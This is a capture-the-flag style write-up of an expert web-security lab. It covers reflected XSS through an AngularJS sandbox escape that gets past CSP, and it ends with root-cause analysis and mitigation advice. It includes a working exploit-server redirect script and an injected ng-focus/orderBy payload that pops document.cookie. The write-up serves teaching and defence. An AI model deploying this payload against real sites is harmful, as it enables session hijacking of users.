Reflected XSS — AngularJS sandbox escape + CSP bypass

Lab Difficulty: Expert
Vulnerability: Reflected XSS leveraging AngularJS expression evaluation (sandbox escape) + CSP bypass

Summary

This lab shows a neat combo: the app reflects attacker-controlled HTML/attributes into the DOM and Angular compiles those attributes as expressions. By using an ng-focus expression that walks the event path and feeding it to the orderBy filter, we can assign alert to a local name and call it with document.cookie. That executes alert(document.cookie) even though CSP is present and Angular’s normal sandbox protections are supposed to block this. Interesting and slippery.

Steps Taken

Opened the exploit server for the lab and pasted the exploit script (replace YOUR-LAB-ID with the lab ID):

<script>
  location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
</script>


Clicked Store and then Deliver exploit to victim (standard flow). Nothing flashy at first glance — just a stored payload.

The victim (lab page) loads the reflected ?search= parameter which contains this element after URL-decoding:

<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x


The fragment #x (or focusing the input) triggers the ng-focus expression. Angular evaluates the filter argument while iterating the event path array returned by $event.composedPath().

The expression (z=alert)(document.cookie) runs in a context where alert is callable (we assigned it to z) and pops alert(document.cookie). Cookie displayed — lab solved.

Quick PoC (decoded):

Injected element: <input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>

Trigger: focus the input (the URL uses #x to do this automatically)

Result: alert(document.cookie)

Root Cause

The application reflects user-supplied HTML/attributes into the page and Angular compiles those attributes as expressions. Angular filters (like orderBy) evaluate argument expressions, and $event.composedPath() gives access to an array that can reach window-like contexts. The exploit uses an assignment trick (z=alert)(document.cookie) to avoid Angular’s direct global checks and execute in the needed scope. CSP didn’t block it because we never injected a <script> — we abused the app’s own JS (Angular) to evaluate attacker-controlled data.

Short version: attacker input turned into Angular-executed code — bad.

Fixes and Mitigation

Never reflect untrusted input as HTML/attributes. Treat user input as data only. Escape/HTML-encode by default.

Don’t let user input become Angular expressions or attributes. Never insert user data into ng-* attributes or any place the framework will compile or evaluate it.

Use a strict sanitizer if you must allow HTML. Prefer built-in or well-audited sanitizers ($sanitize) and whitelist only safe tags/attributes — but be careful, sanitizers are easy to misuse.

Prefer safe bindings. Use text binding ({{ }} with proper escaping) or ng-bind over ng-bind-html unless sanitized.

Layer defenses — CSP + encoding. CSP helps, but it’s not a silver bullet when the app’s own JS runtime evaluates attacker-controlled expressions.

Audit all places where user input flows into templates or attributes. Anything that can become executable code must be blocked or sanitized.
